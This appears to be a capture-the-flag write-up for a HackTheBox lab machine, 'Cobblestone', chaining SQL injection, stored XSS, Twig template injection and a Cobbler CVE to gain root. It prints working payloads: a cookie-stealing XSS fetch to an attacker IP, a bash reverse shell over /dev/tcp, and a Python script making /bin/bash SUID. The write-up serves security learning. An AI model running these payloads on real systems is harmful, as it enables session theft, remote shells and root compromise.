---
layout: default
title: "Cobblestone"
parent: Insane Machines
grand_parent: Machines
permalink: /machines/insane/cobblestone/
---

# Cobblestone

![Machine Badge](https://img.shields.io/badge/Machine-Cobblestone-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red)

| Property | Value |
|----------|-------|
| **OS** | Debian 12 |
| **Difficulty** | Insane |
| **Release** | 2025 (Season 8) |
| **Tags** | #second-order-sqli #load_file #xss #ssti #twig #hash-crack #cobbler #cve-2024-47533 |

---

## Summary

Cobblestone is a multi-stage web-to-root Insane chain on Debian 12. Subdomain fuzzing reveals two vhosts: `vote.cobblestone.htb` (SQL injection) and `deploy.cobblestone.htb` (admin panel + Twig SSTI). The attack chains:

1. **Second-order SQLi** in the vote subdomain
2. **MySQL `LOAD_FILE`** to read server-side files including admin source / session secrets
3. **Stored XSS** to steal admin session
4. **Twig template injection** on the deploy panel for RCE
5. Hash cracking for SSH lateral
6. **Cobbler XMLRPC API (CVE-2024-47533)** binding to `127.0.0.1:25151` and running as root, exploited for final root

---

## External Writeups

- [Wither2Rebirth - HTB Cobblestone](https://wither2rebirth.com/reports/htb-Cobblestone)
- [BenHeater - HackTheBox Cobblestone](https://benheater.com/hackthebox-cobblestone/)
- [NoSec - Cobblestone Writeup](https://nosecpwn.eu/cobblestone/en/)
- [Mane's Blog - Cobblestone Patch Analysis](https://manesec.github.io/2025/08/20/2025/57-hackthebox-Cobblestone-patch/)
- [CyberSecGuru - Mastering Cobblestone](https://thecybersecguru.com/ctf-walkthroughs/mastering-cobblestone-beginners-guide-from-hackthebox/)
- [4xura (Protected)](https://4xura.com/writeups-for-ctfs/htb-writeup-cobblestone/)
- [ShadowV0id (Protected)](https://shadowv0id.vercel.app/posts/hackthebox/cobblestone/cobblestone/)
- [Course Hero - Cobblestone Writeup PDF](https://www.coursehero.com/file/254500498/cobblestone-writeuppdf/)

---

## Key Techniques

- vhost fuzzing (`ffuf -H "Host: FUZZ.cobblestone.htb"`)
- **Second-order SQL injection** (payload stored, executed on later request)
- MySQL `LOAD_FILE('/path/to/file')` for arbitrary file read (requires `FILE` privilege)
- **Stored XSS** to capture admin cookie / token
- **Twig SSTI** via `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
- bcrypt/argon2 hash cracking
- **CVE-2024-47533** - Cobbler XMLRPC unauth code execution via `cobblerd` on localhost

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC cobblestone.htb
# 22, 80, 443
ffuf -u http://FUZZ.cobblestone.htb -H "Host: FUZZ.cobblestone.htb" \
     -w subdomains.txt -mc 200,403
# -> vote.cobblestone.htb, deploy.cobblestone.htb
```

### 2. Second-Order SQLi

`vote.cobblestone.htb` registration accepts a comment field. The comment is later embedded in a SELECT on the admin moderation page:

```sql
SELECT * FROM comments WHERE author = '<stored input>'
```

Register with comment:

```
x', (SELECT LOAD_FILE('/var/www/deploy/.env'))) -- -
```

The next time the admin page renders, the payload reads `/var/www/deploy/.env` and embeds the contents in the rendered HTML.

### 3. Stored XSS for Admin Cookie

A different field on vote allows HTML through a regex bypass. Inject:

```html
<svg/onload=fetch('http://10.10.14.5/'+document.cookie)>
```

Admin loads moderation page -> cookie exfiltrated.

### 4. Twig SSTI on Deploy Panel

Authenticated as admin, the deploy panel renders a Twig template from a user-supplied "Deployment Description":

```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")}}
```

Shell as `www-deploy`.

### 5. Hash Crack & SSH

Database dump reveals bcrypt hashes:

```bash
hashcat -m 3200 hashes.txt rockyou.txt
# user : <pw>
ssh user@cobblestone.htb
```

### 6. Cobbler XMLRPC CVE-2024-47533 (Root)

Enumerate:

```bash
ss -ltnp | grep 25151
# 127.0.0.1:25151  cobblerd (root)
```

CVE-2024-47533: an `xmlrpc_methods` permission check is missing for `background_*` tasks; combined with token forgery via `login()` with empty creds in default config:

```python
import xmlrpc.client
c = xmlrpc.client.ServerProxy('http://127.0.0.1:25151')
token = c.login('', '')
# Trigger background_buildiso with attacker-controlled args that invoke shell
c.background_buildiso({'iso':'/tmp/p.iso','profiles':'$(chmod +s /bin/bash)'}, token)
```

`/bin/bash -p` -> uid 0.

---

## Lessons Learned

- **Second-order SQLi** is harder to detect with off-the-shelf scanners; manual review of stored-then-rendered fields is necessary.
- `LOAD_FILE` requires the `FILE` privilege on MySQL - default installs sometimes have it; CTF boxes almost always do.
- **Twig SSTI** payloads have stabilised around `_self.env.registerUndefinedFilterCallback("system")` - one of the most reliable PHP-side SSTI primitives.
- **Cobbler XMLRPC on localhost** is a recurring "root by trust" - the daemon trusts unauthenticated localhost callers.
- Chained Insane boxes reward careful vhost enumeration; every distinct vhost is a separate attack surface.

---

## References

- CVE-2024-47533: https://nvd.nist.gov/vuln/detail/CVE-2024-47533
- Cobbler project: https://cobbler.github.io/
- Twig SSTI payloads: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
